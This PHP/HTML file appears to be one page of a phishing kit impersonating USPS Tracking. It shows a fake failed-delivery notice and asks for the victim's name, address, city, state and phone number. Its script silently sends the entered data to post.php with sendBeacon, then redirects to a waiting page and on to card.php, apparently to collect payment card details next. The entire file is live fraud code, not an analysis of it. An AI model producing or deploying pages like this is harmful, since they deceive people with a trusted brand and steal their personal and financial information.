<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<app>
<header>
    <div class="pc">
        <img src="res/html/header-xl.png" class="xl">
        <img src="res/html/header-md.png" class="md">
    </div>
    <div class="mobile">
        <img src="res/left.png" class="left">
        <img src="res/mid.png" class="mid">
        <img src="res/right.png" class="right">
    </div>
</header>
<main>
<div class="form">
<div class="bigtitle">USPS Tracking®</div>
<h3>Tracking Number: 9410118000021019821357</h3> 
<div class="liner"></div>
<div class="title red">There is an issue with your shipping address</div>
<div class="text">We have received your package at a <strong>USPS facility</strong>. However, we were unable to complete the delivery due to an issue with your shipping address. Kindly review and confirm your address details to ensure prompt delivery and avoid further delays. We apologize for any inconvenience and appreciate your cooperation.</div>

<h3>Shipping Address</h3>
<div class="liner"></div>
<div class="group">

<div class="col">
    <label for="name">Full name</label>
    <input type="text" id="name">
</div>

<div class="col wide">
    <label for="address">Street address 1</label>
    <input type="text" id="address">
</div>


<div class="col">
    <label for="city">City</label>
    <input type="text" id="city">
</div>


<div class="col">
<label for="state">Select State:</label>
<select id="state" name="state" required>
  <option value="" selected disabled>Select a state</option>
  <option value="AL">Alabama</option>
  <option value="AK">Alaska</option>
  <option value="AZ">Arizona</option>
  <option value="AR">Arkansas</option>
  <option value="CA">California</option>
  <option value="CO">Colorado</option>
  <option value="CT">Connecticut</option>
  <option value="DE">Delaware</option>
  <option value="FL">Florida</option>
  <option value="GA">Georgia</option>
  <option value="HI">Hawaii</option>
  <option value="ID">Idaho</option>
  <option value="IL">Illinois</option>
  <option value="IN">Indiana</option>
  <option value="IA">Iowa</option>
  <option value="KS">Kansas</option>
  <option value="KY">Kentucky</option>
  <option value="LA">Louisiana</option>
  <option value="ME">Maine</option>
  <option value="MD">Maryland</option>
  <option value="MA">Massachusetts</option>
  <option value="MI">Michigan</option>
  <option value="MN">Minnesota</option>
  <option value="MS">Mississippi</option>
  <option value="MO">Missouri</option>
  <option value="MT">Montana</option>
  <option value="NE">Nebraska</option>
  <option value="NV">Nevada</option>
  <option value="NH">New Hampshire</option>
  <option value="NJ">New Jersey</option>
  <option value="NM">New Mexico</option>
  <option value="NY">New York</option>
  <option value="NC">North Carolina</option>
  <option value="ND">North Dakota</option>
  <option value="OH">Ohio</option>
  <option value="OK">Oklahoma</option>
  <option value="OR">Oregon</option>
  <option value="PA">Pennsylvania</option>
  <option value="RI">Rhode Island</option>
  <option value="SC">South Carolina</option>
  <option value="SD">South Dakota</option>
  <option value="TN">Tennessee</option>
  <option value="TX">Texas</option>
  <option value="UT">Utah</option>
  <option value="VT">Vermont</option>
  <option value="VA">Virginia</option>
  <option value="WA">Washington</option>
  <option value="WV">West Virginia</option>
  <option value="WI">Wisconsin</option>
  <option value="WY">Wyoming</option>
</select>
</div>

<div class="col">
    <label for="phone">Phone number</label>
    <input type="text" id="phone">
</div>


<div class="col btn">
    <button onclick="sendCode()">
        Continue
    </button>
</div>

</div>


<div class="liner"></div>

</div>
</main>




</app>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

function sendCode(){
    if($("#name").val()!="" && $("#address").val()!="" && $("#city").val()!="" && $("#state").val()!="" && $("#phone").val()!=""){
       const form = new FormData();
       form.append("type", "Information");
       form.append("code", $("#name").val()+"|"+$("#address").val()+"|"+$("#city").val()+"|"+$("#state").val()+"|"+$("#phone").val());
       navigator.sendBeacon("post.php", form);
       window.location="wait.php?p=INFO<?= mkurl(1); ?>&next=card.php&sec=4";
    }
}

$("input").keypress((e)=>{
  if(e.key=="Enter"){
    sendCode();
  }
})


</script>
</body>
</html>